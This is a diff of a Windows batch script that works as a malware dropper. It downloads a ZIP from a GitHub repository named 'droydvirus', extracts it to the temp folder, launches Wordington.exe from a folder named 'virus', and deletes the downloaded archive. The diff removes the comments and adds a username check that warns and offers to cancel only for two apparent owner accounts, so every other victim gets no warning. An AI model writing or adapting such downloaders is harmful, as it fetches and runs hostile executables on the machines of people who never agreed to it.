@@ -1,32 +1,40 @@
 @echo off
 setlocal
 
-:: Define variables
 set "repo_url=https://github.com/X17sa/droydvirus/archive/refs/heads/main.zip"
 set "zip_path=%TEMP%\droydvirus.zip"
 set "extract_path=%TEMP%\droydvirus"
 set "downloads_path=%USERPROFILE%\Downloads"
 
-:: Download the ZIP file
+set "user_name=%USERNAME%"
+
+if /I "%user_name%"=="princ" (
+    echo This Will Penaltize Your Computer. Are You Sure? Owner.
+    set /p confirm=Type "yes" to continue, "no" to cancel: 
+    if /I "%confirm%"=="no" exit
+)
+
+if /I "%user_name%"=="adisa" (
+    echo This Will Penaltize Your Computer. Are You Sure? Owner.
+    set /p confirm=Type "yes" to continue, "no" to cancel: 
+    if /I "%confirm%"=="no" exit
+)
+
 echo Downloading repository...
 powershell -Command "& {Invoke-WebRequest '%repo_url%' -OutFile '%zip_path%'}"
 
-:: Extract the ZIP file
 echo Extracting ZIP...
 powershell -Command "& {Expand-Archive -Path '%zip_path%' -DestinationPath '%extract_path%' -Force}"
 
-:: Find the Neighborhood folder and move it to Downloads
 echo Moving Neighborhood folder...
 for /d %%D in ("%extract_path%\*") do if exist "%%D\Neighborhood" move "%%D\Neighborhood" "%downloads_path%"
 
-:: Navigate to the virus folder and run Wordington.exe
 echo Running Wordington.exe...
 for /d %%D in ("%extract_path%\*") do if exist "%%D\virus" (
     cd /d "%%D\virus"
     start Wordington.exe
 )
 
-:: Cleanup
 echo Cleaning up...
 del "%zip_path%"
 exit
